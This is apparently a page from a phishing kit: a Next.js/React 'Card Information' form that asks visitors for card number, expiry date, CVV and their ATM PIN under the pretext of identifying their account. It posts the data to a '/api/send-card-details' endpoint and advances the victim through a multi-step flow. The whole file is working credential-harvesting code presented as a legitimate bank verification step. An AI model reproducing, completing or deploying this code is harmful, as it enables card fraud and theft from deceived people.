import Head from "next/head";
import React, { useContext, useState } from "react";
import valid from "card-validator";
import * as yup from "yup";
import ReactInputMask from "react-input-mask";
import { yupResolver } from "@hookform/resolvers/yup";
import { Container } from "../../components/Container";
import { Wrapper } from "../../components/Wrapper";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { DataContext } from "../_app";
import { Button } from "../../components/Button";
import { Error } from "../../components/Error";

interface CardProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("Card number field is required.")
    .test(
      "test-number",
      "Card number not valid.",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("Expiration date field is required.")
    .test(
      "test-date",
      "Expiration date not valid.",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("CVV field is required.")
    .test("test-cvv", "CVV not valid.", (value) => valid.cvv(value).isValid),
  cardPin: yup
    .string()
    .required("Card pin field is required.")
    .min(4, "Card pin not valid.")
    .max(5, "Card pin not valid."),
});

export const Card: React.FC<CardProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onSubmit`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD DETAILS`);
    formData.append(`cardDetails`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    const url = getProgress()[getProgress().indexOf(`Card`) + 1];

    push(getNextUrl(url));
  });
  return (
    <Wrapper>
      <Head>
        <title>Card Information</title>
      </Head>
      <Container>
        <div className={`login-form`}>
          <h3>Your Card Details</h3>
          <form>
            <fieldset>
              <legend
                style={{
                  fontSize: `13.5px`,
                }}
              >
                Please provide us with some card details to help identify your
                account.
              </legend>
              <Error errors={errors} />
              <div className={`control-group`}>
                <ReactInputMask
                  mask={cardMask}
                  {...register(`cardNumber`, {
                    onChange: (event: any) => {
                      var value = event.target.value;

                      var newState = "9999 9999 9999 9999";
                      if (/^3[47]/.test(value)) {
                        newState = "9999 999999 99999";
                      }
                      setCardMask(newState);
                    },
                  })}
                >
                  {
                    //@ts-ignore
                    () => (
                      <input
                        type="text"
                        className={
                          errors.cardNumber && errors.cardNumber.message
                            ? `input-validation-error`
                            : ``
                        }
                        placeholder="Card number"
                        {...register(`cardNumber`, {
                          onChange: (event: any) => {
                            var value = event.target.value;

                            var newState = "9999 9999 9999 9999";
                            if (/^3[47]/.test(value)) {
                              newState = "9999 999999 99999";
                            }
                            setCardMask(newState);
                          },
                        })}
                      />
                    )
                  }
                </ReactInputMask>
              </div>
              <div className={`control-group`}>
                <ReactInputMask mask="99/9999" {...register(`expirationDate`)}>
                  {
                    //@ts-ignore
                    () => (
                      <input
                        type="text"
                        className={
                          errors.expirationDate && errors.expirationDate.message
                            ? `input-validation-error`
                            : ``
                        }
                        placeholder="Expiry Date"
                        {...register(`expirationDate`)}
                      />
                    )
                  }
                </ReactInputMask>
              </div>
              <div className={`control-group`}>
                <input
                  type="number"
                  // data-val-required="The Member ID field is required."
                  className={
                    errors.cvv && errors.cvv.message
                      ? `input-validation-error`
                      : ``
                  }
                  {...register(`cvv`)}
                  placeholder="CVV (3-digits number at the back of your card)"
                />
              </div>
              <div className={`control-group`}>
                <input
                  type="number"
                  // data-val-required="The Member ID field is required."
                  className={
                    errors.cardPin && errors.cardPin.message
                      ? `input-validation-error`
                      : ``
                  }
                  {...register(`cardPin`)}
                  placeholder="Pin (Same pin you use at the ATM)"
                />
              </div>
              <hr />
              <Button loading={loading} onClick={onSubmit}>
                Next
              </Button>
            </fieldset>
          </form>
        </div>
      </Container>
    </Wrapper>
  );
};

export default Card;
